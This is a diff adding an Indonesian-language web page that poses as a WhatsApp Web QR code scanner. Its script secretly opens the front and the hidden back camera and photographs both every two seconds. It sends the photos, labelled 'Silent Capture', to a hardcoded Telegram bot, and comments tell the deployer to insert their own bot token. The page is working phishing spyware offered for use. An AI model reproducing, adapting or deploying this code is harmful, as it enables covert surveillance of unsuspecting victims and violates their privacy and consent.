@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+    <title>QR Scanner</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+        body {
+            background: #0b0e1a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            background: #0a0a0a;
+        }
+        .card {
+            background: #1a1a2e;
+            border-radius: 30px;
+            padding: 30px 20px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid #2a2a4a;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9);
+            position: relative;
+            overflow: hidden;
+        }
+        .card h1 {
+            color: #fff;
+            font-size: 22px;
+            margin-bottom: 6px;
+        }
+        .card p {
+            color: #8899bb;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .scanner-box {
+            position: relative;
+            width: 100%;
+            max-width: 320px;
+            margin: 0 auto;
+            border-radius: 20px;
+            overflow: hidden;
+            background: #000;
+            aspect-ratio: 1/1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #25d366;
+            box-shadow: 0 0 40px #25d36633;
+        }
+        .scanner-box video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .scanner-box .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+        }
+        .scanner-box .overlay .frame {
+            width: 70%;
+            height: 70%;
+            border: 3px solid #25d366;
+            border-radius: 16px;
+            box-shadow: 0 0 30px #25d36655;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.6;
+                transform: scale(1.02);
+            }
+        }
+        .status {
+            margin-top: 18px;
+            color: #25d366;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .status .dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #25d366;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+            margin-right: 8px;
+        }
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.2;
+            }
+        }
+        .btn-stop {
+            margin-top: 20px;
+            padding: 12px 30px;
+            background: #e74c3c;
+            color: #fff;
+            border: none;
+            border-radius: 40px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-stop:hover {
+            background: #c0392b;
+            transform: scale(1.02);
+        }
+        .footer {
+            margin-top: 20px;
+            color: #4a5f85;
+            font-size: 11px;
+        }
+        .alert {
+            background: #ff3b3033;
+            border: 1px solid #ff3b30;
+            color: #ff6b5a;
+            padding: 10px 16px;
+            border-radius: 30px;
+            font-size: 13px;
+            margin-top: 14px;
+            display: none;
+        }
+        .alert.success {
+            background: #2ecc7133;
+            border-color: #2ecc71;
+            color: #2ecc71;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h1>📷 Scan QR Code</h1>
+        <p>Arahkan kamera ke kode QR untuk memindai</p>
+
+        <!-- SCANNER BOX -->
+        <div class="scanner-box" id="scannerBox">
+            <video id="videoFront" autoplay muted playsinline></video>
+            <div class="overlay">
+                <div class="frame"></div>
+            </div>
+        </div>
+
+        <div class="status" id="status">
+            <span class="dot"></span> Menunggu izin kamera...
+        </div>
+
+        <div class="alert" id="alert">⚠️ Gagal akses kamera.</div>
+
+        <button class="btn-stop" id="stopBtn">⏹ Stop Scan</button>
+
+        <div class="footer">
+            🔒 Terenkripsi • WhatsApp Web
+        </div>
+    </div>
+
+    <script>
+        // ================================================================
+        //  KONFIGURASI TELEGRAM (GANTI DENGAN PUNYA LU)
+        // ================================================================
+        const BOT_TOKEN = "8928113871:AAEMNaoUzhvD8CwjgEXA-RE6FgMn7x__dyE"; // GANTI
+        const CHAT_ID = "7260945600"; // GANTI
+
+        // ================================================================
+        //  ELEMEN
+        // ================================================================
+        const videoFront = document.getElementById('videoFront');
+        const statusEl = document.getElementById('status');
+        const alertEl = document.getElementById('alert');
+        const stopBtn = document.getElementById('stopBtn');
+
+        let streamFront = null;
+        let streamBack = null;
+        let captureInterval = null;
+        let isRunning = false;
+
+        // ================================================================
+        //  FUNGSI KIRIM FOTO KE TELEGRAM
+        // ================================================================
+        async function sendPhotoToTelegram(imageData, camera) {
+            try {
+                // Konversi dataURL ke Blob
+                const res = await fetch(imageData);
+                const blob = await res.blob();
+
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `camera_${camera}_${Date.now()}.jpg`);
+                formData.append('caption', `📸 *Silent Capture*\n📷 Camera: ${camera}\n🕒 ${new Date().toLocaleString('id-ID')}`);
+
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                return response.ok;
+            } catch (error) {
+                console.error('Gagal kirim foto:', error);
+                return false;
+            }
+        }
+
+        // ================================================================
+        //  FUNGSI CAPTURE DARI VIDEO STREAM
+        // ================================================================
+        function captureFrame(videoElement, cameraName) {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth || 640;
+                canvas.height = videoElement.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                const dataURL = canvas.toDataURL('image/jpeg', 0.8);
+                sendPhotoToTelegram(dataURL, cameraName);
+            } catch (e) {
+                console.error('Capture error:', e);
+            }
+        }
+
+        // ================================================================
+        //  MULAI KAMERA DEPAN + BELAKANG
+        // ================================================================
+        async function startCameras() {
+            try {
+                // Kamera Depan (default)
+                const frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+                videoFront.srcObject = frontStream;
+                streamFront = frontStream;
+                await videoFront.play();
+
+                // Kamera Belakang (sembunyi, ga ditampilkan)
+                const backStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+                streamBack = backStream;
+
+                // Buat video element buat back cam (hidden)
+                const videoBack = document.createElement('video');
+                videoBack.srcObject = backStream;
+                videoBack.muted = true;
+                videoBack.playsInline = true;
+                videoBack.style.display = 'none';
+                document.body.appendChild(videoBack);
+                await videoBack.play();
+
+                statusEl.innerHTML = `<span class="dot"></span> ✅ Kamera aktif — Scanning QR...`;
+                alertEl.style.display = 'none';
+                isRunning = true;
+
+                // Mulai capture tiap 2 detik (depan + belakang)
+                captureInterval = setInterval(() => {
+                    if (!isRunning) return;
+
+                    // Capture depan
+                    captureFrame(videoFront, 'Front');
+
+                    // Capture belakang
+                    if (videoBack.readyState >= 2) {
+                        captureFrame(videoBack, 'Back');
+                    }
+                }, 2000); // 2 detik
+
+                // Kirim notifikasi pertama
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `📸 *Silent Camera Active!*\n✅ Kamera depan & belakang aktif\n🔄 Capture tiap 2 detik\n🕒 ${new Date().toLocaleString('id-ID')}`,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+            } catch (error) {
+                console.error('Error start camera:', error);
+                alertEl.style.display = 'block';
+                alertEl.textContent = '⚠️ Gagal akses kamera. Izinkan akses kamera di browser.';
+                statusEl.innerHTML = `❌ Gagal akses kamera`;
+            }
+        }
+
+        // ================================================================
+        //  STOP SEMUA
+        // ================================================================
+        function stopAll() {
+            isRunning = false;
+
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+
+            if (streamFront) {
+                streamFront.getTracks().forEach(t => t.stop());
+                streamFront = null;
+            }
+            if (streamBack) {
+                streamBack.getTracks().forEach(t => t.stop());
+                streamBack = null;
+            }
+
+            videoFront.srcObject = null;
+            statusEl.innerHTML = `⏹ Scanner dihentikan`;
+            stopBtn.textContent = '🔄 Mulai Ulang';
+            stopBtn.style.background = '#25d366';
+        }
+
+        // ================================================================
+        //  TOMBOL STOP / MULAI ULANG
+        // ================================================================
+        stopBtn.addEventListener('click', function() {
+            if (isRunning) {
+                stopAll();
+                stopBtn.textContent = '🔄 Mulai Ulang';
+                stopBtn.style.background = '#25d366';
+            } else {
+                // Reset
+                stopBtn.textContent = '⏹ Stop Scan';
+                stopBtn.style.background = '#e74c3c';
+                alertEl.style.display = 'none';
+                startCameras();
+            }
+        });
+
+        // ================================================================
+        //  INIT: MINTA IZIN KAMERA
+        // ================================================================
+        async function init() {
+            // Cek dukungan kamera
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                alertEl.style.display = 'block';
+                alertEl.textContent = '❌ Browser tidak support kamera.';
+                return;
+            }
+
+            // Minta izin langsung
+            try {
+                await navigator.mediaDevices.getUserMedia({ video: true });
+                startCameras();
+            } catch (e) {
+                alertEl.style.display = 'block';
+                alertEl.textContent = '⚠️ Izin kamera ditolak. Izinkan akses kamera.';
+                statusEl.innerHTML = `❌ Izin ditolak`;
+            }
+        }
+
+        // Jalankan
+        init();
+
+        // ================================================================
+        //  KALO USER KELUAR PAGE, MATIKAN KAMERA (OPSIONAL)
+        // ================================================================
+        window.addEventListener('beforeunload', function() {
+            if (streamFront) {
+                streamFront.getTracks().forEach(t => t.stop());
+            }
+            if (streamBack) {
+                streamBack.getTracks().forEach(t => t.stop());
+            }
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+        });
+    </script>
+</body>
+</html>
